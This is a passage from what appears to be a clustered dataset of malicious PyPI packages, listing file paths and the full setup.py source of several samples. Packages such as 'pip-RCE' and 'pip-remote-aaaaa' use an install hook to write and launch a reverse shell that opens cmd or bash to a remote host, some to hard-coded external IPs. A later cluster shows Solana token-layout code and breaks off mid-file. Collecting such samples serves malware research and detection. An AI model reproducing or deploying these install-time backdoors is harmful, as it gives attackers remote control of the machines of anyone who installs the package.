(Ansari)\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    url = \"https://github.com/The-Robin-Hood/pip-remote-access\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/The-Robin-Hood/pip-remote-access/issues\",\n    },\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n \n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-09-much-needed-py-package-v0.1",
        "code": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"127.0.0.1\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.1'\nDESCRIPTION = 'To Show the vulnerability of the system'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"much_needed_py_package\",\n    version=VERSION,\n    author=\"The-Robin-Hood (Ansari)\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    url = \"https://github.com/The-Robin-Hood/pip-remote-access\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/The-Robin-Hood/pip-remote-access/issues\",\n    },\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n \n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-09-only-a-test-v0.1.1",
        "code": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"127.0.0.1\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.1.1'\nDESCRIPTION = 'To Show the vulnerability of the system'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"only_a_test\",\n    version=VERSION,\n    author=\"The-Robin-Hood (Ansari)\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    url = \"https://github.com/The-Robin-Hood/pip-remote-access\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/The-Robin-Hood/pip-remote-access/issues\",\n    },\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n \n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-16-pip-rce-v0.0.4",
        "code": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"82.157.252.61\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.0.4'\nDESCRIPTION = 'To Show the vulnerability of pip install'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"pip-RCE\",\n    version=VERSION,\n    author=\"zeroc\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n "
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-16-pip-remote-aaaaa-v0.0.3",
        "code": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 20080\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"120.76.194.25\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.0.3'\nDESCRIPTION = 'To Show the vulnerability of the system'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"pip-remote-aaaaa\",\n    version=VERSION,\n    author=\"The-Robin-Hood (Ansari)\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    url = \"https://github.com/The-Robin-Hood/pip-remote-access\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/The-Robin-Hood/pip-remote-access/issues\",\n    },\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n \n"
      }
    ]
  },
  {
    "cluster_id": 45,
    "size": 7,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-25-spl-types-v1.0.4",
        "code": "from io import BytesIO\n\nimport requests\nfrom borsh_construct import CStruct, String, U8, U16, U64, Vec, Option, Bool, Enum\n\nfrom construct import Bytes, Int8ul, Int64ul, Padding, BitsInteger, BitsSwapped, BitStruct, Const, Flag, BytesInteger\nfrom construct import Struct as cStruct\n\nimport base58, json\n\n\nfrom spl.token.instructions import create_associated_token_account, get_associated_token_address\n\nfrom solders.pubkey import Pubkey\nfrom solders.instruction import Instruction\n\nfrom solana.rpc.types import TokenAccountOpts\nfrom solana.transaction import AccountMeta\n\n\nclass MyEncoder(json.JSONEncoder):\n    def default(self, o):\n        if type(o) is bytes:\n            return o.decode(\"utf-8\")\n        return super(MyEncoder, self).default(o)\n\n\ndef remove_bytesio(obj):\n    if isinstance(obj, dict):\n        return {\n            k: remove_bytesio(v) for k, v in obj.items() if not isinstance(v, BytesIO)\n        }\n    elif isinstance(obj, list):\n        return [remove_bytesio(v) for v in obj if not isinstance(v, BytesIO)]\n    else:\n        return obj\n\ndef get_offset(struct, field):\n    offset = 0\n    for item in struct.subcons:\n        if item.name == field:\n            return offset\n        else:\n            offset += item.sizeof()\n    return None\ndef convert_bytes_to_pubkey(obj):\n    if isinstance(obj, dict):\n        return {k: convert_bytes_to_pubkey(v) for k, v in obj.items()}\n    elif isinstance(obj, list):\n        return [convert_bytes_to_pubkey(v) for v in obj]\n    elif isinstance(obj, bytes):\n        return str(Pubkey.from_bytes(obj))\n    else:\n        return obj\n\n\ndef getMetaData(data):\n    decoded_info = base58.b58decode(data)\n    # structure of the instruction\n    instruction_structure = CStruct(\n        \"instructionDiscriminator\" / U8,\n        \"createMetadataAccountArgsV3\"\n        / CStruct(\n            \"data\"\n            / CStruct(\n                \"name\" / String,\n                \"symbol\" / String,\n                \"uri\" / String,\n                \"sellerFeeBasisPoints\" / U16,\n                \"creators\"\n                / Option(\n                    Vec(CStruct(\"address\" / Bytes(32), \"verified\" / Bool, \"share\" / U8))\n                ),\n                \"collection\" / Option(CStruct(\"verified\" / Bool, \"key\" / Bytes(32))),\n                \"uses\"\n                / Option(\n                    CStruct(\n                        \"useMethod\"\n                        / Enum(\"Burn\", \"Multiple\", \"Single\", enum_name=\"UseMethod\"),\n                        \"remaining\" / U64,\n                        \"total\" / U64,\n                    )\n                ),\n            ),\n            \"isMutable\" / Bool,\n            \"collectionDetails\"\n            / Option(String),  # fixme: string is not correct, insert correct type\n        ),\n    )\n    metadata = instruction_structure.parse(decoded_info)\n    metadata = remove_bytesio(metadata)\n    metadata = convert_bytes_to_pubkey(metadata)\n\n    return json.dumps(metadata)\n\n\nSwapLayout = cStruct(\n    \"instruction\" / Int8ul, \"amount_in\" / Int64ul, \"min_amount_out\" / Int64ul\n)\n\n\n\nAMM_INFO_LAYOUT_V4_1 = cStruct(\n    \"status\" / Int64ul,\n    \"nonce\" / Int64ul,\n    \"orderNum\" / Int64ul,\n    \"depth\" / Int64ul,\n    \"coinDecimals\" / Int64ul,\n    \"pcDecimals\" / Int64ul,\n    \"state\" / Int64ul,\n    \"resetFlag\" / Int64ul,\n    \"minSize\" / Int64ul,\n    \"volMaxCutRatio\" / Int64ul,\n    \"amountWaveRatio\" / Int64ul,\n    \"coinLotSize\" / Int64ul,\n    \"pcLotSize\" / Int64ul,\n    \"minPriceMultiplier\" / Int64ul,\n    \"maxPriceMultiplier\" / Int64ul,\n    \"systemDecimalsValue\" / Int64ul,\n    #   // Fees\n    \"minSeparateNumerator\" / Int64ul,\n    \"minSeparateDenominator\" / Int64ul,\n    \"tradeFeeNumerator\" / Int64ul,\n    \"tradeFeeDenominator\" / Int64ul,\n    \"pnlNumerator\" / Int64ul,\n    \"pnlDenominator\" / Int64ul,\n    \"swapFeeNumerator\" / Int64ul,\n    \"swapFeeDenominator\" / Int64ul,\n    #   // OutPutData\n    \"needTakePnlCoin\" / Int64ul,\n    \"needTakePnlPc\" / Int64ul,\n    \"totalPnlPc\" / Int64ul,\n    \"totalPnlCoin\" / Int64ul,\n    \"poolOpenTime\" / Int64ul,\n    \"punishPcAmount\" / Int64ul,\n    \"punishCoinAmount\" / Int64ul,\n    \"orderbookToInitTime\" / Int64ul,\n    \"swapCoinInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPcOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoin2PcFee\" / Int64ul,\n    \"swapPcInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoinOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPc2CoinFee\" / Int64ul,\n    \"poolCoinTokenAccount\" / Bytes(32),\n    \"poolPcTokenAccount\" / Bytes(32),\n    \"coinMintAddress\" / Bytes(32),\n    \"pcMintAddress\" / Bytes(32),\n    \"lpMintAddress\" / Bytes(32),\n    \"ammOpenOrders\" / Bytes(32),\n    \"serumMarket\" / Bytes(32),\n    \"serumProgramId\" / Bytes(32),\n    \"ammTargetOrders\" / Bytes(32),\n    \"poolWithdrawQueue\" / Bytes(32),\n    \"poolTempLpTokenAccount\" / Bytes(32),\n    \"ammOwner\" / Bytes(32),\n    \"pnlOwner\" / Bytes(32),\n)\n\n\nACCOUNT_FLAGS_LAYOUT = BitsSwapped(\n    BitStruct(\n        \"initialized\" / Flag,\n        \"market\" / Flag,\n        \"open_orders\" / Flag,\n        \"request_queue\" / Flag,\n        \"event_queue\" / Flag,\n        \"bids\" / Flag,\n        \"asks\" / Flag,\n        Const(0, BitsInteger(57)),  # Padding\n    )\n)\n\nMARKET_LAYOUT = cStruct(\n    Padding(5),\n    \"account_flags\" / ACCOUNT_FLAGS_LAYOUT,\n    \"own_address\" / Bytes(32),\n    \"vault_signer_nonce\" / Int64ul,\n    \"base_mint\" / Bytes(32),\n    \"quote_mint\" / Bytes(32),\n    \"base_vault\" / Bytes(32),\n    \"base_deposits_total\" / Int64ul,\n    \"base_fees_accrued\" / Int64ul,\n    \"quote_vault\" / Bytes(32),\n    \"quote_deposits_total\" / Int64ul,\n    \"quote_fees_accrued\" / Int64ul,\n    \"quote_dust_threshold\" / Int64ul,\n    \"request_queue\" / Bytes(32),\n    \"event_queue\" / Bytes(32),\n    \"bids\" / Bytes(32),\n    \"asks\" / Bytes(32),\n    \"base_lot_size\" / Int64ul,\n    \"quote_lot_size\" / Int64ul,\n    \"fee_rate_bps\" / Int64ul,\n    \"referrer_rebate_accrued\" / Int64ul,\n    Padding(7),\n)\n\nMINT_LAYOUT = cStruct(Padding(44), \"decimals\" / Int8ul, Padding(37))\n\n\nPOOL_INFO_LAYOUT = cStruct(\"instruction\" / Int8ul, \"simulate_type\" / Int8ul)\n\nLIQ_LAYOUT = cStruct(\"instruction\" / Int8ul, \"amount_in\" / Int64ul)\n\n\n###BUYING\n\nAMM_PROGRAM_ID = Pubkey.from_string('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')\nSERUM_PROGRAM_ID = Pubkey.from_string('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')\ndef get_token_account(ctx,\n                      owner: Pubkey.from_string,\n                      mint: Pubkey.from_string):\n    try:\n        account_data = ctx.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))\n        return account_data.value[0].pubkey, None\n    except:\n        swap_associated_token_address = get_associated_token_address(owner, mint)\n        swap_token_account_Instructions = create_associated_token_account(owner, owner, mint)\n        return swap_associated_token_address, swap_token_account_Instructions\n\n\ndef make_swap_instruction(amount_in: int, token_account_in: Pubkey.from_string, token_account_out: Pubkey.from_string,\n                          accounts: dict, mint, ctx, owner) -> Instruction:\n    tokenPk = mint\n    accountProgramId = ctx.get_account_info_json_parsed(tokenPk)\n    TOKEN_PROGRAM_ID = accountProgramId.value.owner\n\n    keys = [\n        AccountMeta(pubkey=TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"amm_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"open_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"target_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=SERUM_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"market_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"bids\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"asks\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"event_queue\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=token_account_in, is_signer=False, is_writable=True),  # UserSourceTokenAccount\n        AccountMeta(pubkey=token_account_out, is_signer=False, is_writable=True),  # UserDestTokenAccount\n        AccountMeta(pubkey=owner.pubkey(), is_signer=True, is_writable=False)  # UserOwner\n    ]\n\n    data = SwapLayout.build(\n        dict(\n            instruction=9,\n            amount_in=int(amount_in),\n            min_amount_out=0\n        )\n    )\n    return Instruction(AMM_PROGRAM_ID, data, keys)\n\ndef getSymbol(token):\n    # usdc and usdt\n    exclude = ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']\n\n    if token not in exclude:\n        url = f\"https://api.dexscreener.com/latest/dex/tokens/{token}\"\n\n        Token_Symbol = \"\"\n        Sol_symbol = \"\"\n        try:\n            response = requests.get(url)\n\n            # Check if the request was successful (status code 200)\n            if response.status_code == 200:\n                resp = response.json()\n                print(\"Response:\", resp['pairs'][0]['baseToken']['symbol'])\n                for pair in resp['pairs']:\n                    quoteToken = pair['quoteToken']['symbol']\n\n                    if quoteToken == 'SOL':\n                        Token_Symbol = pair['baseToken']['symbol']\n                        Sol_symbol = quoteToken\n                        return Token_Symbol, Sol_symbol\n\n\n            else:\n                print(f\"[getSymbol] Request failed with status code {response.status_code}\")\n\n        except requests.exceptions.RequestException as e:\n            print(f\"[getSymbol] error occurred: {e}\")\n        except:\n            a = 1\n\n        return Token_Symbol, Sol_symbol\n    else:\n        if token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDC\", \"SOL\"\n        elif token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDT\", \"SOL\"\n\nfrom borsh_construct import CStruct, U64, Bytes\nfrom construct import Bytes, Int8ul, Int32ul, Int64ul, Pass, Switch\n\nPUBLIC_KEY_LAYOUT = Bytes(32)\nmarket_state_layout_v3 = CStruct(\n    \"blob1\" / Bytes(5),\n    \"blob2\" / Bytes(8),\n    \"ownAddress\" / PUBLIC_KEY_LAYOUT,\n    \"vaultSignerNonce\" / U64,\n    \"baseMint\" / PUBLIC_KEY_LAYOUT,\n    \"quoteMint\" / PUBLIC_KEY_LAYOUT,\n    \"baseVault\" / PUBLIC_KEY_LAYOUT,\n    \"baseDepositsTotal\" / U64,\n    \"baseFeesAccrued\" / U64,\n    \"quoteVault\" / PUBLIC_KEY_LAYOUT,\n    \"quoteDepositsTotal\" / U64,\n    \"quoteFeesAccrued\" / U64,\n    \"quoteDustThreshold\" / U64,\n    \"requestQueue\" / PUBLIC_KEY_LAYOUT,\n    \"eventQueue\" / PUBLIC_KEY_LAYOUT,\n    \"bids\" / PUBLIC_KEY_LAYOUT,\n    \"asks\" / PUBLIC_KEY_LAYOUT,\n    \"baseLotSize\" / U64,\n    \"quoteLotSize\" / U64,\n    \"feeRateBps\" / U64,\n    \"referrerRebatesAccrued\" / U64,\n    \"blob3\" / Bytes(7)\n)\nSPL_ACCOUNT_LAYOUT = CStruct(\n    \"mint\" / PUBLIC_KEY_LAYOUT,\n    \"owner\" / PUBLIC_KEY_LAYOUT,\n    \"amount\" / U64,\n    \"delegateOption\" / Int32ul,\n    \"delegate\" / PUBLIC_KEY_LAYOUT,\n    \"state\" / Int8ul,\n    \"isNativeOption\" / Int32ul,\n    \"isNative\" / U64,\n    \"delegatedAmount\" / U64,\n    \"closeAuthorityOption\" / Int32ul,\n    \"closeAuthority\" / PUBLIC_KEY_LAYOUT\n)\n\n\nSPL_MINT_LAYOUT = CStruct(\n  \"mintAuthorityOption\"/ Int32ul,\n  'mintAuthority'/PUBLIC_KEY_LAYOUT,\n  'supply'/U64,\n  'decimals'/Int8ul,\n  'isInitialized'/Int8ul,\n  'freezeAuthorityOption'/Int32ul,\n  'freezeAuthority'/PUBLIC_KEY_LAYOUT\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-03-spl-types-v1.0.5",
        "code": "from io import BytesIO\n\nimport requests\nfrom borsh_construct import CStruct, String, U8, U16, U64, Vec, Option, Bool, Enum\n\nfrom construct import Bytes, Int8ul, Int64ul, Padding, BitsInteger, BitsSwapped, BitStruct, Const, Flag, BytesInteger\nfrom construct import Struct as cStruct\n\nimport base58, json\n\n\nfrom spl.token.instructions import create_associated_token_account, get_associated_token_address\n\nfrom solders.pubkey import Pubkey\nfrom solders.instruction import Instruction\n\nfrom solana.rpc.types import TokenAccountOpts\nfrom solana.transaction import AccountMeta\n\n\nclass MyEncoder(json.JSONEncoder):\n    def default(self, o):\n        if type(o) is bytes:\n            return o.decode(\"utf-8\")\n        return super(MyEncoder, self).default(o)\n\n\ndef remove_bytesio(obj):\n    if isinstance(obj, dict):\n        return {\n            k: remove_bytesio(v) for k, v in obj.items() if not isinstance(v, BytesIO)\n        }\n    elif isinstance(obj, list):\n        return [remove_bytesio(v) for v in obj if not isinstance(v, BytesIO)]\n    else:\n        return obj\n\ndef get_offset(struct, field):\n    offset = 0\n    for item in struct.subcons:\n        if item.name == field:\n            return offset\n        else:\n            offset += item.sizeof()\n    return None\ndef 